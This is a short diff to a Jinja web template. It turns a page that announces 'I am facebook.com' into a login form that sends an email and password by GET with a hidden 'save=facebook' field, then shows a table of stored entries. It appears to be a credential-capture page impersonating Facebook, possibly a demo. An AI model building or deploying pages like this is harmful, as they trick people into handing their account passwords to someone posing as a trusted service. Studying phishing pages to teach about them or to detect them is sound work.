@@ -2,9 +2,19 @@
 {% block content %}
 <div>
     <h1>I am facebook.com</h1>
-    <form action="post">
-        <input type="text" name="email" placeholder="e-mail" /> <br/> <br/>
-        <input type="password" name="password" placeholder="Password" />
+    <form method="get">
+        <input type="hidden" name="save" value="facebook" />
+        <input type="text" name="email" placeholder="e-mail" /> <br/>
+        <input type="password" name="password" placeholder="Password" /><br/>
+        <input type="submit" value="login" />
     </form>
+
+    {% if data %}
+        <table>
+            {% for line in data %}
+            <tr><td>{{line[0]}}</td></tr>
+            {% endfor %}
+        </table>
+    {% endif %}
 </div>
 {% endblock %}
